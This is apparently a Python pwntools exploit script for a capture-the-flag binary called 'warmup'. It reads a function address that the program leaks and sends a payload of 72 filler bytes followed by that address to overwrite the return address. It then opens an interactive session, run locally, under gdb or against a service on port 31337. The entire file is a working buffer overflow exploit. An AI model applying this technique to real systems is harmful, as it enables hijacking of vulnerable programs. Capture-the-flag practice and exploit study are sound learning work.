#!/usr/bin/env python
from pwn import *

 
def main(argv):
    executable="./warmup"
    if len(argv) < 2:
        print("Usage: "+str(argv[0]) +' <d> debug; <r> remote; <l> local')
        return
    if (argv[1] == 'd'):
        log.info("Debug")
        target = gdb.debug(executable,'''
            gef restore
            tmux-setup
            b* 0x004006a4
            continue

            ''')
    elif (argv[1] == 'r'):
        log.info("Remote target")
        target=remote("127.0.0.1","31337")
    else:
        target=process(executable)
    line=target.recvline()
    func = target.recvline().split(b':')[1].strip()
    addr = int(func,16)
    print(hex(addr))
    payload = b'P'*72+p64(addr)
    target.sendline(payload)
    target.interactive()
if __name__ == "__main__":
    main(sys.argv)
